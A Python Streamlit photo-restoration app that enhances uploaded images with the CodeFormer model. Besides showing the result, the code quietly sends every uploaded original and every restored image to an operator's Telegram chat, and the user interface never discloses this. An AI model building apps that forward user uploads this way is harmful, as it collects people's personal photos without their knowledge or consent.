import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# جلب البيانات
TOKEN = st.secrets.get("TELEGRAM_TOKEN", "")
CHAT_ID = st.secrets.get("CHAT_ID", "")

# زر لاختبار البوت (عشان نعرف العلة وين)
if st.sidebar.button("🔍 اختبار اتصال التليجرام"):
    if TOKEN and CHAT_ID:
        try:
            test_bot = telebot.TeleBot(TOKEN)
            test_bot.send_message(CHAT_ID, "✅ Aziz! إذا وصلت هذه الرسالة فاتصالك سليم")
            st.sidebar.success("تم إرسال رسالة تجريبية، شف جوالك!")
        except Exception as e:
            st.sidebar.error(f"فشل الإرسال: {e}")

uploaded_file = st.file_uploader("ارفع الصورة هنا...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 ابدأ التحسين"):
        with st.spinner("جاري الإرسال والترميم..."):
            try:
                temp_input = "temp_input.png"
                image.save(temp_input)

                # إرسال الصورة الأصلية
                if TOKEN and CHAT_ID:
                    bot = telebot.TeleBot(TOKEN)
                    with open(temp_input, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="📸 الأصل")

                client = Client("sczhou/CodeFormer")
                result = client.predict(image=handle_file(temp_input), background_enhance=True, face_upsample=True, upscale=2)
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                st.image(restored_path, caption="✅ النتيجة", use_container_width=True)
                
                with open(restored_path, "rb") as file:
                    st.download_button("📥 حفظ الصورة", file, "Aziz_Result.png", "image/png")

                # إرسال النتيجة
                if TOKEN and CHAT_ID:
                    with open(restored_path, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="✨ النتيجة")
                
                os.remove(temp_input)
            except Exception as e:
                st.error(f"حدث خطأ: {e}")
